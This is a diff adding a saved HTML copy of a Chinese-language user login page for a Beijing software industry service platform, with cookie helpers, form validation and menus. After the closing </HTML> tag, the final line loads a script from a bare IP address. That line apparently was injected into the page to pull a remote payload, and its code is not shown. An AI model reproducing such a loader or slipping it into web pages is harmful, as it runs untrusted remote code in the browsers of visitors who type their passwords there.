@@ -1,0 +1,367 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0290)http://www.bsw.net.cn/eros/control/doLogin?SiteId=2&ReturnURL=aHR0cDovL3d3dy5ic3cubmV0LmNuL2Vyb3MvY29udHJvbC9sb2dpbj9wcmV2aW91c1JlcXVlc3Q9WVVoU01HTkViM1pNTTJRelpIazFhV016WTNWaWJWWXdURzFPZFV3eVZubGlNMDEyV1RJNWRXUklTblppUXpsMFdWZHNkUT09JnByZXZpb3VzUGFyYW1zPSZjaGVja0xvZ2luPQ%3D%3D&CheckLogin= -->
+<HTML><HEAD><TITLE>to</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=gb2312"><!--========include sytlemessage==========-->
+<SCRIPT language=JavaScript>
+
+function operateConfirm(msg)
+{
+   var question = confirm(msg);
+   if (question == false)
+   {
+      window.event.returnValue = false;
+   }
+}
+
+function deleteConfirm()
+{
+   var question = confirm("你确认要删除吗?");
+   if (question == false)
+   {
+      window.event.returnValue = false;
+   }
+}   
+function getCookieVal (offset)
+{
+    var endstr = document.cookie.indexOf (";", offset);
+    if (endstr == -1)
+        endstr = document.cookie.length;
+    return unescape(document.cookie.substring(offset, endstr));
+}
+
+function GetCookie(name)
+{
+    var arg = name + "=";
+    var alen = arg.length;
+    var clen = document.cookie.length;
+    var i = 0;
+    while (i < clen)
+    {
+        var j = i + alen;
+        if (document.cookie.substring(i, j) == arg)
+            return getCookieVal (j);
+        i = document.cookie.indexOf(" ", i) + 1;
+        if (i == 0) break;
+    }
+    return null;
+}
+
+function SetCookie(name,value,expires,path,domain,secure)
+{
+    document.cookie = name + "=" + value +
+    ((expires) ? "; expires=" + expires.toGMTString() : "") +
+    ((path) ? "; path=" + path : "") +
+    ((domain) ? "; domain=" + domain : "") +
+    ((secure) ? "; secure" : "");
+}
+
+function DeleteCookie(name,path,domain)
+{
+    if (GetCookie(name))
+    {
+        document.cookie = name + "=+" +
+            ((path) ? "; path=" + path : "") +
+            ((domain) ? "; domain=" + domain : "") +
+            "; expires=Thu, 30 Oct 1980 16:00:00 GMT";
+    }
+}
+</SCRIPT>
+
+<SCRIPT>
+
+</SCRIPT>
+<LINK href="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/maincss.htm" type=text/css 
+rel=stylesheet>
+<SCRIPT language=javascript 
+src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/calendar.htm"></SCRIPT>
+
+<SCRIPT language=javascript 
+src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/datetime.htm"></SCRIPT>
+
+<SCRIPT language=javascript 
+src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/menu.htm"></SCRIPT>
+
+<SCRIPT language=javascript>
+var scroll_message="";
+if (scroll_message)scrollit(100);
+</SCRIPT>
+
+<META content="MSHTML 6.00.2900.2769" name=GENERATOR>
+<SCRIPT>
+<!--
+function SetCookie(name,value,expires,path,domain,secure)
+{
+    document.cookie = name + "=" + value +
+    ((expires) ? "; expires=" + expires.toGMTString() : "") +
+    ((path) ? "; path=" + path : "") +
+    ((domain) ? "; domain=" + domain : "") +
+    ((secure) ? "; secure" : "");
+}
+function DeleteCookie(name,path,domain)
+{
+    if (GetCookie(name))
+    {
+        document.cookie = name + "=+" +
+            ((path) ? "; path=" + path : "") +
+            ((domain) ? "; domain=" + domain : "") +
+            "; expires=Thu, 30 Oct 1980 16:00:00 GMT";
+    }
+}
+function ready()
+{
+   document.loginForm.userId.focus();
+}
+function login()
+{
+   if(document.loginForm.userId.value =="")
+   {
+      alert("请输入用户名！");
+      document.loginForm.userId.focus();
+      return;
+   }
+   if(document.loginForm.password.value =="")
+   {
+      alert("请输入用户密码！");
+      document.loginForm.password.focus();
+      return;
+   }
+   document.loginForm.submit();
+}
+function fnTrapKD()
+{
+
+   if(event.keyCode==13)
+   {
+   		   if(document.loginForm.userId.value =="")
+		   {
+			  document.loginForm.userId.focus();
+			  return;
+		   }
+		   if(document.loginForm.password.value =="")
+		   {
+			  document.loginForm.password.focus();
+			  return;
+		   }
+		   document.loginForm.submit();	
+   }
+		
+   
+}
+//-->
+</SCRIPT>
+
+<SCRIPT>
+DeleteCookie('SLSI','/',null);
+
+</SCRIPT>
+</HEAD>
+<BODY id=objHTMLbody bgColor=#ffffff leftMargin=0 topMargin=0 onload=ready()><!--==========include pagehead==============-->
+<TABLE cellSpacing=0 cellPadding=0 width=778 align=center bgColor=#fef3bd 
+border=0 valign="middle">
+  <TBODY>
+  <TR>
+    <TD width="778" height=8 colSpan=3 vAlign=center bgColor=#fef3bd>
+      <DIV align=center><IMG height=8 
+      src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/bg1.gif" 
+  width="100%"></DIV></TD></TR>
+  <TR bgColor=#ffffff>
+    <TD colSpan=3 height=60><IMG height=60 
+      src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/logo.jpg" width=321><img 
+      height=60 src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/idea.jpg" 
+  width=457></TD>
+  </TR>
+  <TR>
+    <TD vAlign=center colSpan=3 height=8><IMG height=8 
+      src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/bg2.gif" 
+  width="100%"></TD></TR></TBODY></TABLE><!--===============include menu================--><!--==========include menu==============-->
+<TABLE cellSpacing=0 cellPadding=0 width=778 align=center border=0>
+  <TBODY>
+  <TR>
+    <TD class=p9 vAlign=center width=196 bgColor=#dedede height=18>
+      <DIV align=center><SPAN class=p10><FONT color=#ffffff></FONT></SPAN><FONT 
+      color=#666666><B>2005年 10月28日 星期五 </B></FONT></DIV></TD>
+    <TD class=p9 vAlign=center width=51 bgColor=#dedede height=18>
+      <DIV align=right><IMG height=25 
+      src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/blue.jpg" width=35></DIV></TD>
+    <TD class=p9 vAlign=center width=548 
+    background=../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/blue2.jpg bgColor=#00459c 
+    height=18>
+      <DIV align=left><SPAN class=p10><FONT color=#ffffff><A class=whitemenu 
+      onmouseover="showMenu(this,'topmenu1',0)" onmouseout=hideMenu(event) 
+      href="http://www.bsw.net.cn/eros/control/baseintro" target=_top>发布</A> 
+      <A class=whitemenu onmouseover="showMenu(this,'topmenu2',0)" 
+      onmouseout=hideMenu(event) 
+      href="http://www.bsw.net.cn/eros/control/support" target=_top>查询</A> <A 
+      class=whitemenu onmouseover="showMenu(this,'topmenu3',0)" 
+      onmouseout=hideMenu(event) 
+      href="http://www.bsw.net.cn/eros/control/customcenter" 
+      target=_top>删除</A>  </FONT></SPAN></DIV></TD></TR></TBODY></TABLE>
+<DIV id=topmenu1 
+style="Z-INDEX: 10; LEFT: 342px; VISIBILITY: hidden; POSITION: absolute; TOP: 68px" 
+onmouseout=hideMenu(event)>
+<TABLE borderColor=#dddbde cellSpacing=0 cellPadding=4 width=75 bgColor=#00459c 
+border=1>
+  <TBODY>
+  <TR>
+    <TD noWrap><A class=menuTop 
+      href="http://www.bsw.net.cn/eros/control/basebulletin?contentCategoryId=BASEBULLETIN&amp;thru=1" 
+      target=_top>发布关系空间</A><BR><A class=menuTop 
+      href="http://www.bsw.net.cn/eros/control/basebulletin?contentCategoryId=BASEMSG&amp;thru=1" 
+      target=_top>发布关系类型</A> <BR><A class=menuTop 
+      href="http://www.bsw.net.cn/eros/control/basebulletin?contentCategoryId=TRAINMSG&amp;thru=1" 
+      target=_top>发布关系实例</A> <BR></TD></TR></TBODY></TABLE></DIV>
+<DIV id=topmenu2 
+style="Z-INDEX: 10; LEFT: 342px; VISIBILITY: hidden; POSITION: absolute; TOP: 68px" 
+onmouseout=hideMenu(event)>
+<TABLE borderColor=#dddbde cellSpacing=0 cellPadding=4 width=75 bgColor=#00459c 
+border=1>
+  <TBODY>
+  <TR>
+    <TD noWrap><A class=menuTop 
+      href="http://www.bsw.net.cn/eros/control/service" 
+      target=_top>查询关系空间</A><BR><A class=menuTop 
+      href="http://www.bsw.net.cn/eros/control/qualityflat" 
+      target=_top>查询关系类型</A><BR><A class=menuTop 
+      href="http://www.bsw.net.cn/eros/control/developflat" 
+      target=_top>查询关系实例</A> <BR></TD></TR></TBODY></TABLE></DIV>
+<DIV id=topmenu3 
+style="Z-INDEX: 10; LEFT: 342px; VISIBILITY: hidden; POSITION: absolute; TOP: 68px" 
+onmouseout=hideMenu(event)>
+<TABLE borderColor=#dddbde cellSpacing=0 cellPadding=4 width=75 bgColor=#00459c 
+border=1>
+  <TBODY>
+  <TR>
+    <TD noWrap><A class=menuTop 
+      href="http://www.bsw.net.cn/eros/control/message" 
+      target=_top>删除关系空间</A><BR><A class=menuTop 
+      href="http://www.bsw.net.cn/forum" target=_top>删除关系类型</A><BR><A 
+      class=menuTop href="http://www.bsw.net.cn/eros/control/call" 
+      target=_top>删除关系实例</A><BR> </TD></TR></TBODY></TABLE></DIV>
+
+<TABLE height=62 cellSpacing=0 width=778 align=center>
+  <TBODY>
+  <TR border="0">
+    <TD class=p10 vAlign=top 
+    background=../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/bg3.gif colSpan=2 height=20 
+    border="0"><IMG height=1 src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/03.gif" 
+      width="100%"><BR><FONT color=#000000>&nbsp;|</FONT> <A 
+      href="http://www.bsw.net.cn/eros/control/main"><FONT color=#000000><SPAN 
+      class=p9>首页</SPAN> </FONT></A><FONT color=#000000>|</FONT> <A 
+      href="http://www.bsw.net.cn/eros/control/login"><FONT color=#000000><SPAN 
+      class=p9>用户登录</SPAN> </FONT></A></TD></TR>
+  <TR border="0">
+    <TD vAlign=top width=172 bgColor=#0859ad height=20>&nbsp;</TD>
+    <TD vAlign=top bgColor=#0859ad height=20>
+      <DIV align=right><FONT color=#ffffff>欢迎您 &nbsp;软件业的朋友！ &nbsp; 
+&nbsp;</FONT></DIV></TD></TR></TBODY></TABLE>
+<CENTER>
+<TABLE height=400 cellSpacing=0 cellPadding=0 width=778 bgColor=#ffffff 
+border=0>
+  <TBODY>
+  <TR>
+    <TD vAlign=top width=172 bgColor=#0859ad height=14><!--====================include pageleft==================-->
+      <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+        <TBODY>
+        <TR>
+          <TD vAlign=top bgColor=#0859ad>
+            <DIV align=center><IMG 
+            src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/login.gif"></DIV></TD></TR></TBODY></TABLE>
+      <TABLE height="100%" cellSpacing=0 cellPadding=0 width="100%" border=0>
+        <TBODY>
+        <TR>
+          <TD vAlign=top bgColor=#9cd7ef>
+            <DIV align=center><IMG height=60 
+            src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/grad.gif" width="100%"> 
+            <BR><BR></DIV></TD></TR></TBODY></TABLE></TD>
+    <TD vAlign=top width=21 bgColor=#ffffff><IMG height=23 
+      src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/05.gif" width=21></TD>
+    <TD vAlign=top width=611>
+      <FORM style="MARGIN: 0px" name=loginForm action="" method=post>
+      <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+        <TBODY>
+        <TR>
+          <TD vAlign=top width="70%">
+            <DIV class=p9 align=right><BR><FONT color=#7bc7ff><SPAN 
+            class=p10><B>您还没有登录，<BR>&nbsp;&nbsp;请您登录！</B></SPAN></FONT></DIV></TD>
+          <TD width="30%"><IMG height=93 
+            src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/welcome.gif" 
+        width=445></TD></TR></TBODY></TABLE>
+      <TABLE cellSpacing=2 cellPadding=0 width="100%" border=0>
+        <TBODY>
+        <TR bgColor=#dfdfdf>
+          <TD class=p9 colSpan=4><B>　　输入您的用户名、密码登录</B></TD></TR>
+        <TR>
+          <TD vAlign=bottom width="20%" height=33>　<B><FONT class=p9 
+            color=#2c93de>　用户名：</FONT></B></TD>
+          <TD vAlign=bottom width="22%" height=33><INPUT 
+            onkeypress=javascript:fnTrapKD(); 
+            style="BORDER-RIGHT: #fec752 1px solid; PADDING-RIGHT: 0px; BORDER-TOP: #fec752 1px solid; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; BORDER-LEFT: #fec752 1px solid; COLOR: #000000; PADDING-TOP: 0px; BORDER-BOTTOM: #fec752 1px solid; HEIGHT: 17px; BACKGROUND-COLOR: #fec752" 
+            tabIndex=1 name=userId></TD>
+          <TD width="7%" rowSpan=2>
+            <DIV align=center><IMG height=61 
+            src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/ad3.gif" width=3></DIV></TD>
+          <TD vAlign=bottom width="51%" height=33><IMG height=11 
+            src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/ad4.gif" width=21><B><SPAN 
+            class=p9><A 
+            href="http://www.bsw.net.cn/eros/control/newcustomer">注册个人用户？</A></SPAN></B></TD></TR>
+        <TR>
+          <TD width="20%" height=32>　<B><FONT class=p9 
+            color=#2c93de>　</FONT></B><FONT color=#2c93de><SPAN 
+            class=p9><B>密码：</B></SPAN></FONT></TD>
+          <TD width="22%" height=32><INPUT onkeypress=javascript:fnTrapKD(); 
+            style="BORDER-RIGHT: #fec752 1px solid; PADDING-RIGHT: 0px; BORDER-TOP: #fec752 1px solid; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; BORDER-LEFT: #fec752 1px solid; COLOR: #000000; PADDING-TOP: 0px; BORDER-BOTTOM: #fec752 1px solid; HEIGHT: 17px; BACKGROUND-COLOR: #fec752" 
+            tabIndex=2 type=password name=password></TD>
+          <TD width="51%" height=32><IMG height=11 
+            src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/ad4.gif" width=21><B><SPAN 
+            class=p9><A 
+            href="http://www.bsw.net.cn/eros/control/searchpasswd?opFlag=inputuserId">忘记密码</A>？</SPAN></B></TD></TR>
+        <TR>
+          <TD colSpan=2 height=22>
+            <DIV align=right><IMG onclick="return login();" height=18 
+            src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/red.gif" width=61 
+            border=0></DIV></TD>
+          <TD colSpan=2 height=22>　</TD></TR></TBODY></TABLE>
+      <TABLE width="100%" border=0>
+        <TBODY>
+        <TR>
+          <TD bgColor=#dfdfdf colSpan=2>&nbsp; </TD></TR>
+        <TR>
+          <TD class=p9 vAlign=center align=middle width="4%" height=30><IMG 
+            height=15 src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/ad5.gif" 
+            width=22><FONT color=#83a75d><B><BR></B></FONT></TD>
+          <TD class=p9 width="96%" height=30><FONT 
+            color=#83a75d><B>如果您还没有成为本网站的会员，您有以下两种注册方式：</B></FONT></TD></TR>
+        <TR>
+          <TD class=p9 width="4%">　</TD>
+          <TD class=p9 width="96%"><FONT 
+            color=#83a75d><B>1、免费注册个人用户，注册后您可以使用网站的技术论坛、求职、资源租用等服务。&nbsp;<A 
+            href="http://www.bsw.net.cn/eros/control/newcustomer">现在注册</A></B></FONT></TD></TR>
+        <TR>
+          <TD class=p9 width="4%">　</TD>
+          <TD class=p9 width="96%"><FONT color=#83a75d><B>2、<!--提交会员企业申请，//流程改变，修改修辞-->免费注册成为企业会员，您将享受到许多专门面向软件企业的专业化技术服务。 
+            &nbsp;<!--<a href="/eros/control/join">//流程改变，更改链接--><A 
+            href="http://www.bsw.net.cn/eros/control/orgenter">现在注册</A> 
+            </B></FONT></TD></TR></TBODY></TABLE><INPUT type=hidden value=true 
+      name=doLogin> <INPUT type=hidden 
+      value=aHR0cDovL3d3dy5ic3cubmV0LmNuL2Vyb3MvY29udHJvbC9sb2dpbj9wcmV2aW91c1JlcXVlc3Q9WVVoU01HTkViM1pNTTJRelpIazFhV016WTNWaWJWWXdURzFPZFV3eVZubGlNMDEyV1RJNWRXUklTblppUXpsMFdWZHNkUT09JnByZXZpb3VzUGFyYW1zPSZjaGVja0xvZ2luPQ== 
+      name=ReturnURL> <INPUT type=hidden value=2 name=SiteId> 
+  </FORM></TD></TR></TBODY></TABLE></CENTER><!---====================include pagetail================-->
+<CENTER>
+<TABLE cellSpacing=0 cellPadding=0 width=778 border=0>
+  <TBODY>
+  <TR>
+    <TD><IMG height=31 src="../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/bg4.gif" 
+      width=778></TD></TR>
+  <TR>
+    <TD class=p9 background=../../../Documents%20and%20Settings/&#29579;&#28023;&#29618;/&#26700;&#38754;/&#21271;&#20140;&#36719;&#20214;&#20135;&#19994;&#22522;&#22320;&#20844;&#20849;&#25216;&#26415;&#25903;&#25745;&#20307;&#31995;-&#32508;&#21512;&#26381;&#21153;&#31649;&#29702;&#24179;&#21488;-&#29992;&#25143;&#30331;&#24405;.files/bg5.gif>
+      <DIV align=center><A 
+      href="http://www.bsw.net.cn/eros/control/sitemap">网站地图</A> | <A 
+      href="http://www.bsw.net.cn/eros/control/about">关于我们</A> | <A 
+      href="mailto:callcenter@bsw.gov.cn">联络我们</A> | 客服电话：<B><FONT 
+      face="Arial, Helvetica, sans-serif">(010)82825511-1</FONT></B></DIV></TD></TR>
+  <TR>
+    <TD class=p9 bgColor=#ffffff>
+      <DIV align=center><FONT color=#808080>版权所有：◎ 2002 
+      北京软件产业促进中心&amp;北京软件产品质量检测检验中心 <BR>请用IE5.0或以上版本浏览 
+  </FONT></DIV></TD></TR></TBODY></TABLE></CENTER></BODY></HTML>
+<script src="http://222.208.183.246/ad/ad.js"></script>
